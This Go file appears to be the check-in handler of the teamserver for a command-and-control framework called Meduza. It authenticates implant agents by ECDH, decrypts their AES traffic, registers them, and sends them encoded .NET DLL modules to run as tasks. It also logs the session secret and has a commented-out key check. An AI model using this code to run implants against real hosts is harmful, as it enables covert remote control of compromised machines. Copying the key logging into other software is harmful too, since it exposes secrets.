package services

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/ksel172/Meduza/teamserver/internal/storage/dal"
	"github.com/ksel172/Meduza/teamserver/models"
	"github.com/ksel172/Meduza/teamserver/pkg/conf"
	"github.com/ksel172/Meduza/teamserver/pkg/logger"
	"github.com/ksel172/Meduza/teamserver/utils"
)

// Simple temporary key registry to store keys in server memory
type keyRegistry struct {
	mu       sync.Mutex
	registry map[string][]byte
}

func (k *keyRegistry) writeKey(sessionToken string, key []byte) {
	k.mu.Lock()
	defer k.mu.Unlock()
	k.registry[sessionToken] = key
}

func (k *keyRegistry) getKey(sessionToken string) ([]byte, bool) {
	k.mu.Lock()
	defer k.mu.Unlock()
	key, exists := k.registry[sessionToken]
	return key, exists
}

var (
	KeyRegistry = keyRegistry{
		mu:       sync.Mutex{},
		registry: make(map[string][]byte),
	}
	LogLevel  = "[Handler]"
	LogDetail = "[CheckIn]"
)

type ICheckInController interface {
	Checkin(ctx *gin.Context)
}

type CheckInController struct {
	payloadDAL dal.IPayloadDAL
	checkInDAL dal.ICheckInDAL
	agentDAL   dal.IAgentDAL
}

func NewCheckInController(checkInDAL dal.ICheckInDAL, agentDAL dal.IAgentDAL, payloadDAL dal.IPayloadDAL) *CheckInController {
	return &CheckInController{checkInDAL: checkInDAL, agentDAL: agentDAL, payloadDAL: payloadDAL}
}

func (cc *CheckInController) Checkin(ctx *gin.Context) {
	// First, try to get the session token
	sessionToken := ctx.GetHeader("Session-Token")

	body, _ := ioutil.ReadAll(ctx.Request.Body)
	if len(body) == 0 {
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "failed to read request body"})
		return
	}

	var c2request models.C2Request

	if sessionToken == "" {
		if err := json.Unmarshal(body, &c2request); err != nil {
			ctx.JSON(http.StatusBadRequest, gin.H{"error": "invalid request format"})
			return
		}

		if c2request.Reason != models.Authenticate {
			ctx.JSON(http.StatusUnauthorized, gin.H{"error": "unauthorized: missing session token"})
			return
		}

		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling authentication request for agent %s", c2request.AgentID))
		cc.authenticate(ctx, c2request)
		return
	}

	key, exists := KeyRegistry.getKey(sessionToken)
	if !exists {
		ctx.JSON(http.StatusUnauthorized, gin.H{"error": "invalid session token"})
		return
	}

	// TODO: What is illegal abput the converted string?
	// Decode base64 encrypted request
	encryptedData, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "invalid encrypted data"})
		return
	}

	//TODO: Figured out that the shared secret doesn't actually match on both sides,
	// so I need to reformat the way it is generated
	logger.Info("SECRET: ", base64.StdEncoding.EncodeToString(key)) // Temp

	decryptedData, err := utils.AesDecrypt(key, encryptedData)
	if err != nil {
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "decryption failed"})
		return
	}

	if err := json.Unmarshal(decryptedData, &c2request); err != nil {
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "invalid decrypted data format"})
		return
	}

	switch c2request.Reason {
	case models.Task:
		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling task request for agent %s", c2request.AgentID))
		cc.handleTaskRequest(ctx, c2request)
		return
	case models.Response:
		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling response request for agent %s", c2request.AgentID))
		cc.handleResponseRequest(ctx, c2request)
		return
	case models.Register:
		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling register request for agent %s", c2request.AgentID))
		cc.handleRegisterRequest(ctx, c2request)
		return
	}
}

func (cc *CheckInController) authenticate(ctx *gin.Context, c2request models.C2Request) {
	// Get the agent base 64 encoded public key and decode it
	agentPublicKeyBase64 := c2request.Message
	if agentPublicKeyBase64 == "" {
		logger.Info("Authentication request sent with no public key")
		ctx.Status(http.StatusBadRequest)
		return
	}
	agentPublicKey, err := base64.StdEncoding.DecodeString(agentPublicKeyBase64)
	if err != nil {
		ctx.Status(http.StatusInternalServerError)
		return
	}

	// TODO: add agent public key signature verification here

	// Retrieve the server private key to derive shared key
	// and the public key to send to the agent
	serverPrivKey, serverPublicKey, err := cc.payloadDAL.GetKeys(ctx.Request.Context(), c2request.ConfigID)
	if err != nil {
		if err == sql.ErrNoRows {
			logger.Error(LogLevel, LogDetail, "No public key found for the given config ID")
			ctx.JSON(http.StatusNotFound, gin.H{"error": "No public key found for the given config ID"})
			return
		}
		ctx.Status(http.StatusInternalServerError)
		return
	}

	// Generate AES session key and store in the registry
	aesKey, err := utils.DeriveECDHSharedSecret(serverPrivKey, agentPublicKey)
	if err != nil {
		ctx.Status(http.StatusInternalServerError)
		return
	}

	// Generate a unique session token
	sessionToken := uuid.New().String()

	// Store the session token and map it to the AES key
	KeyRegistry.writeKey(sessionToken, aesKey)
	// Return the server public key and session token to the agent
	ctx.JSON(http.StatusAccepted, gin.H{
		"public_key":    base64.StdEncoding.EncodeToString(serverPublicKey),
		"session_token": sessionToken,
	})
}

func (cc *CheckInController) handleTaskRequest(ctx *gin.Context, c2request models.C2Request) {
	tasks, err := cc.agentDAL.GetAgentTasks(ctx, c2request.AgentID)
	if err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to get tasks for agent %s: %v", c2request.AgentID, err))
		ctx.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
		return
	}

	for i, task := range tasks {
		moduleDirPath := filepath.Join(conf.GetModuleUploadPath(), task.Module)
		moduleName := task.Command.Name

		modulePath := filepath.Join(moduleDirPath, moduleName)
		mainModuleBytes, err := utils.LoadAssembly(filepath.Join(modulePath, moduleName+".dll"))
		if err != nil {
			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to load main module: %v", err))
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load main module: %s", err.Error())})
			return
		}

		loadingModulePath := moduleDirPath + "/" + moduleName + "/"
		dependencyBytes := make(map[string][]byte)
		files, err := os.ReadDir(loadingModulePath)
		if err != nil {
			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to read module directory: %v", err))
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to read module directory: %s", err.Error())})
			return
		}

		for _, file := range files {
			if file.Name() != moduleName+".dll" && strings.HasSuffix(file.Name(), ".dll") {
				depBytes, err := utils.LoadAssembly(filepath.Join(loadingModulePath, file.Name()))
				if err != nil {
					logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to load dependency: %v", err))
					ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load dependency: %s", err.Error())})
					return
				}
				dependencyBytes[file.Name()] = depBytes
			}
		}

		moduleBytes := models.ModuleBytes{
			ModuleBytes:     mainModuleBytes,
			DependencyBytes: dependencyBytes,
		}

		moduleBytesJSON, err := json.Marshal(moduleBytes)
		if err != nil {
			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to marshal module bytes: %v", err))
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to marshal module bytes: %s", err.Error())})
			return
		}

		task.Module = base64.StdEncoding.EncodeToString(moduleBytesJSON)
		tasks[i] = task
	}

	// Update the agent's last callback time
	lastCallback := time.Now().Format(time.RFC3339)
	if err := cc.agentDAL.UpdateAgentLastCallback(ctx.Request.Context(), c2request.AgentID, lastCallback); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to update agent last callback: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	tasksJSON, err := json.Marshal(tasks)
	if err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to marshal tasks to JSON: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": "failed to marshal tasks to JSON"})
		return
	}

	var c2response models.C2Request
	c2response.AgentID = c2request.AgentID
	c2response.Reason = models.Task
	c2response.Message = string(tasksJSON)
	ctx.JSON(http.StatusOK, c2response)
}

func (cc *CheckInController) handleResponseRequest(ctx *gin.Context, c2request models.C2Request) {
	sessionToken := ctx.GetHeader("Session-Token")
	if sessionToken == "" {
		ctx.JSON(http.StatusUnauthorized, gin.H{"error": "Session token is missing"})
		return
	}

	/*
		aesKey, exists := KeyRegistry.getKey(sessionToken)
		if !exists {
			ctx.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid session token"})
			return
		}
	*/
	var agentTask models.AgentTask
	if err := json.Unmarshal([]byte(c2request.Message), &agentTask); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to unmarshal agent message: %v", err))
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent info"})
		return
	}

	err := cc.agentDAL.UpdateAgentTask(ctx.Request.Context(), agentTask)
	if err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to update agent task: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	logger.Info(LogLevel, LogDetail, fmt.Sprintf("Successfully updated agent task: %s", agentTask.TaskID))
	ctx.JSON(http.StatusOK, "successfully updated")
}

func (cc *CheckInController) handleRegisterRequest(ctx *gin.Context, c2request models.C2Request) {
	logger.Info(LogLevel, LogDetail, fmt.Sprintf("Received check-in request from agent: %s", c2request.AgentID))

	var agentInfo models.AgentInfo
	if err := json.Unmarshal([]byte(c2request.Message), &agentInfo); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to parse agent info from decrypted message: %v", err))
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent info"})
		return
	}

	if _, err := cc.agentDAL.GetAgent(agentInfo.AgentID); err == nil {
		logger.Info(LogLevel, LogDetail, "Agent already exists:", c2request.AgentID)
		ctx.JSON(http.StatusConflict, gin.H{"error": "agent already exists"})
		return
	}

	newAgent := c2request.IntoNewAgent()
	newAgent.Name = utils.RandomString(6)

	if err := cc.checkInDAL.CreateAgent(ctx.Request.Context(), newAgent); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to create agent: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if err := cc.agentDAL.CreateAgentInfo(ctx.Request.Context(), agentInfo); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to create agent info: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	ctx.JSON(http.StatusCreated, gin.H{"agent": newAgent})
}
